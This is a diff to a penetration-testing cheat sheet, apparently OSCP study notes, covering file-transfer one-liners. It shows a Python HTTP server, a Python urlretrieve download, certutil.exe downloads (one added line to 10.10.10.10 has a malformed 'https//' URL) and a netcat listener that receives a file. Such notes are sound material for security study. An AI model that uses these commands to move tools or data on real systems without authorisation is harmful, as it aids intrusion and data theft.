@@ -944,8 +944,9 @@
 - [Transferring Files to Windows](https://sushant747.gitbooks.io/total-oscp-guide/content/transfering_files_to_windows.html)
 - [Transferring Files to Linux](https://sushant747.gitbooks.io/total-oscp-guide/content/transfering_files.html)
 - Linux
-  - PYTHON
+  - PYTHON (HTTP)
     - `python -m SimpleHTTPServer <PORT>`
+  - PYTHON
     - `python2.7 -c "from urllib import urlretrieve; urlretrieve('<URL>', '<DESTINATION_FILE>')"`
 
   - FTP
@@ -986,6 +987,7 @@
 
   - CertUtil
     - `certutil.exe -urlcache -split -f "<URL>"`
+    - `certutil.exe -urlcache -f https//10.10.10.10/file.txt file.txt`
 
   - NETCAT
     - `nc -lvp 1234 > <OUT_FILE>`
